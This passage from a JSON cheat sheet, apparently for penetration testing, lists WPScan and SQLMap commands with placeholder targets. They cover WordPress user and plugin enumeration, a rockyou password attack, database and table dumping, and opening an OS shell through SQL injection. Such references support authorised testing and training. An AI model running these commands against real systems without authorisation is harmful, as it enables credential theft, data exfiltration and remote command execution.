    ]
  },
  "wpscan": {
    "title": "WPScan - WordPress Scanner",
    "tags": ["web", "wordpress"],
    "steps": [
      ["Basic", "wpscan --url http://<IP>"],
      ["Users", "wpscan --url http://<IP> -e u"],
      ["Plugins", "wpscan --url http://<IP> -e ap"],
      ["Password attack", "wpscan --url http://<IP> -U users.txt -P rockyou.txt"]
    ]
  },
  "sqlmap": {
    "title": "SQLMap - SQL Injection",
    "tags": ["web", "sqli", "database"],
    "steps": [
      ["Basic", "sqlmap -u 'http://<IP>/page?id=1' --batch"],
      ["List DBs", "sqlmap -u '<URL>' --dbs"],
      ["List tables", "sqlmap -u '<URL>' -D <DB> --tables"],
      ["Dump table", "sqlmap -u '<URL>' -D <DB> -T <TABLE> --dump"],
      ["OS shell", "sqlmap -u '<URL>' --os-shell"],
      ["From file", "sqlmap -r request.txt --batch"]
    ]
  },
